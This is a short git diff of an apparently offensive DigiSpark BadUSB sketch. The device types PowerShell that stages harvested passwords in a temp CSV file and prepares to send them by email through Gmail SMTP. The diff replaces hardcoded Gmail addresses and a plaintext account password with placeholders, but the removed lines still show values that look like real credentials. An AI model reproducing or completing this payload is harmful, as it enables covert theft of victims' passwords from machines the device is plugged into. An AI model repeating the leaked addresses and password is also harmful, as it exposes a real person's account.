@@ -25,10 +25,10 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
 
-  DigiKeyboard.print(F("$email = \"delusccabtw@gmail.com\";"));  // From email address
-  DigiKeyboard.print(F("$addressee = \"delusccafs@gmail.com\";")); // To email address
+  DigiKeyboard.print(F("$email = \"FROM EMAIL\";"));  // From email address
+  DigiKeyboard.print(F("$addressee = \"TO EMAIL\";")); // To email address
   DigiKeyboard.print(F("$tempcsv = \"$env:temp\\temp.csv\";"));  // o lugar onde vai salvar as senhas
-  DigiKeyboard.print(F("$pass = \"Oti24ginger\";"));   // Your account password
+  DigiKeyboard.print(F("$pass = \"PASSWORD\";"));   // Your account password
   DigiKeyboard.print(F("$smtpServer = \"smtp.gmail.com\";"));
   DigiKeyboard.print(F("$port = \"587\";"));
   
